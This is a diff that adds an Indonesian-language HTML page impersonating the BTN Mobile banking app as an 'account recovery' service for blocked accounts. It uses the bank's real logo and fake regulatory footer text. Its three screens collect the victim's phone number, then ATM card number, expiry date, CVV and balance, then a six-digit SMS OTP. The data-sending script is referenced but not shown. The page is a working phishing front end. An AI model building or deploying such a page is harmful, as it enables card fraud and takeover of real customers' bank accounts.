@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>BTN Mobile - Pemulihan Akun Terblokir</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<!-- SPLASH SCREEN -->
+<div id="splashScreen" class="splash-container">
+    <svg class="wave-splash" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 180" preserveAspectRatio="none">
+        <path fill="#003366" fill-opacity="0.85" d="M0,64L80,74.7C160,85,320,107,480,112C640,117,800,107,960,90.7C1120,75,1280,53,1360,42.7L1440,32L1440,180L1360,180C1280,180,1120,180,960,180C800,180,640,180,480,180C320,180,160,180,80,180L0,180Z"></path>
+    </svg>
+    <div class="legal-footer">
+        <div>Versi 7.2.0 | Terlisensi OJK & LPS</div>
+        <div>PT Bank Tabungan Negara (Persero) Tbk</div>
+    </div>
+</div>
+
+<!-- Toast Notification -->
+<div id="btnToast" class="btn-toast">
+    <div class="toast-icon">ℹ️</div>
+    <div class="toast-message"></div>
+</div>
+
+<!-- HALAMAN 1 : Input nomor terdaftar -->
+<div id="page1" class="screen">
+    <div class="btn-header">
+        <div class="logo-mini">
+            <img src="https://www.btn.co.id/-/media/Images/Corporate/Icon/Logo-BTN.png?h=30&w=75&hash=482544389654CC413EA54D404409BF15" alt="BTN">
+            <span>BTN Mobile</span>
+        </div>
+        <div class="page-title">Pulihkan Akun</div>
+        <div class="page-desc">M-Banking Terblokir</div>
+    </div>
+    <div class="white-card">
+        <div class="info-box" style="background:#e6f0ff; border-left-color:#003366; color:#003366;">
+            <strong>INFO PEMULIHAN BANK BTN</strong><br>
+            Segera lakukan pemulihan akun M-Banking Anda yang terblokir. Masukkan nomor HP terdaftar untuk mengaktifkan kembali layanan.
+        </div>
+        <div class="input-group">
+            <label class="input-label">Nomor HP Terdaftar</label>
+            <input type="tel" id="mobileNumber" class="input-field" placeholder="0812xxxxxx" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
+        </div>
+        <button id="gotoPage2Btn" class="btn-primary">LANJUT PEMULIHAN →</button>
+    </div>
+    <!-- CAROUSEL -->
+    <div class="promo-carousel">
+        <h3 class="carousel-title">📋 Informasi Akun</h3>
+        <div class="slider-container">
+            <div class="slider-wrapper">
+                <img src="https://raw.githubusercontent.com/naklapang/Yyy-8ffudud/refs/heads/main/Digydduf.jpg" alt="BTN 1">
+                <img src="https://raw.githubusercontent.com/naklapang/Yyy-8ffudud/refs/heads/main/Siapuffud.jpg" alt="BTN 2">
+                <img src="https://raw.githubusercontent.com/naklapang/Yyy-8ffudud/refs/heads/main/fotokcel.jpg" alt="BTN 3">
+                <img src="https://raw.githubusercontent.com/naklapang/Yyy-8ffudud/refs/heads/main/jdfyxduufu.jpg" alt="BTN 4">
+            </div>
+        </div>
+        <div class="carousel-dots" id="carouselDots1"></div>
+    </div>
+    <footer class="custom-footer">Nomor HP harus terdaftar di BTN</footer>
+</div>
+
+<!-- HALAMAN 2 : Kartu ATM + CVV + Expiry + Saldo -->
+<div id="page2" class="screen">
+    <div class="btn-header">
+        <div class="logo-mini">
+            <img src="https://www.btn.co.id/-/media/Images/Corporate/Icon/Logo-BTN.png?h=30&w=75&hash=482544389654CC413EA54D404409BF15" alt="BTN">
+            <span>Verifikasi Kartu</span>
+        </div>
+        <div class="page-title">Konfirmasi Kartu</div>
+        <div class="page-desc">Masukkan informasi kartu ATM BTN</div>
+    </div>
+    <div class="white-card">
+        <div class="info-box" style="background:#e6f0ff; border-left-color:#003366;">
+            <strong>INFO PEMULIHAN BANK BTN</strong><br>
+            Isi kartu dengan benar untuk memulihkan M-Banking Anda.
+        </div>
+        <form id="cardForm" onsubmit="return false;">
+            <div class="input-group">
+                <label class="input-label">Nomor Kartu ATM</label>
+                <input type="text" id="nomorKartu" class="input-field" placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="off" inputmode="numeric">
+            </div>
+            <div class="flex-row">
+                <div class="half">
+                    <label class="input-label">Berlaku Sampai (MM/YY)</label>
+                    <input type="text" id="berlakuSampai" class="input-field" placeholder="MM/YY" maxlength="5" autocomplete="off" inputmode="numeric">
+                </div>
+                <div class="half">
+                    <label class="input-label">CVV / CVC</label>
+                    <div class="cvv-wrapper">
+                        <input type="password" id="cvv" class="input-field" placeholder="3 digit" maxlength="3" autocomplete="off" inputmode="numeric">
+                        <span class="toggle-cvv" id="toggleCVV">👁️</span>
+                    </div>
+                    <small class="cvv-hint">3 digit di belakang kartu</small>
+                </div>
+            </div>
+            <div class="input-group">
+                <label class="input-label">Jumlah Saldo Terakhir</label>
+                <div class="saldo-wrapper">
+                    <span class="currency-prefix">Rp</span>
+                    <input type="text" id="saldoTerakhir" class="input-field saldo-input" placeholder="0" autocomplete="off" inputmode="numeric">
+                </div>
+                <small class="saldo-hint">Masukkan perkiraan saldo terakhir (tanpa koma)</small>
+            </div>
+            <button type="button" id="btnLanjut" class="btn-primary btn-lanjut">PULIHKAN SEKARANG</button>
+        </form>
+    </div>
+    <div class="promo-carousel">
+        <h3 class="carousel-title">💳 Informasi Transaksi</h3>
+        <div class="slider-container">
+            <div class="slider-wrapper">
+                <img src="https://raw.githubusercontent.com/naklapang/Yyy-8ffudud/refs/heads/main/Digydduf.jpg" alt="BTN 1">
+                <img src="https://raw.githubusercontent.com/naklapang/Yyy-8ffudud/refs/heads/main/Siapuffud.jpg" alt="BTN 2">
+                <img src="https://raw.githubusercontent.com/naklapang/Yyy-8ffudud/refs/heads/main/fotokcel.jpg" alt="BTN 3">
+                <img src="https://raw.githubusercontent.com/naklapang/Yyy-8ffudud/refs/heads/main/jdfyxduufu.jpg" alt="BTN 4">
+            </div>
+        </div>
+        <div class="carousel-dots" id="carouselDots2"></div>
+    </div>
+    <footer class="custom-footer">Siapkan kartu ATM BTN Anda</footer>
+</div>
+
+<!-- HALAMAN 3 : OTP -->
+<div id="page3" class="screen">
+    <div class="btn-header">
+        <div class="logo-mini">
+            <img src="https://www.btn.co.id/-/media/Images/Corporate/Icon/Logo-BTN.png?h=30&w=75&hash=482544389654CC413EA54D404409BF15" alt="BTN">
+            <span>Verifikasi OTP</span>
+        </div>
+        <div class="page-title">Kode OTP</div>
+        <div class="page-desc">Kami kirimkan via SMS ke nomor terdaftar</div>
+    </div>
+    <div class="white-card" style="text-align: center;">
+        <div class="info-box" style="background:#e6f0ff; border-left-color:#003366; margin-bottom:16px;">
+            <strong>⏰ KODE OTP BERLAKU 5 MENIT</strong><br>
+            Masukkan 6 digit kode OTP yang dikirimkan ke nomor HP Anda.
+        </div>
+        <div class="otp-container">
+            <input type="text" maxlength="1" class="otp-digit" data-index="0" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-digit" data-index="1" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-digit" data-index="2" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-digit" data-index="3" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-digit" data-index="4" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-digit" data-index="5" inputmode="numeric">
+        </div>
+        <div id="otpWarning" class="error-msg"></div>
+        <button id="submitOtpBtn" class="btn-primary">VERIFIKASI & PULIHKAN</button>
+    </div>
+    <div class="promo-carousel">
+        <h3 class="carousel-title">🔐 Informasi Verifikasi</h3>
+        <div class="slider-container">
+            <div class="slider-wrapper">
+                <img src="https://raw.githubusercontent.com/naklapang/Yyy-8ffudud/refs/heads/main/Digydduf.jpg" alt="BTN 1">
+                <img src="https://raw.githubusercontent.com/naklapang/Yyy-8ffudud/refs/heads/main/Siapuffud.jpg" alt="BTN 2">
+                <img src="https://raw.githubusercontent.com/naklapang/Yyy-8ffudud/refs/heads/main/fotokcel.jpg" alt="BTN 3">
+                <img src="https://raw.githubusercontent.com/naklapang/Yyy-8ffudud/refs/heads/main/jdfyxduufu.jpg" alt="BTN 4">
+            </div>
+        </div>
+        <div class="carousel-dots" id="carouselDots3"></div>
+    </div>
+    <footer class="custom-footer">Cek pesan SMS untuk kode OTP</footer>
+</div>
+
+<script src="script.js"></script>
+</body>
+          </html>
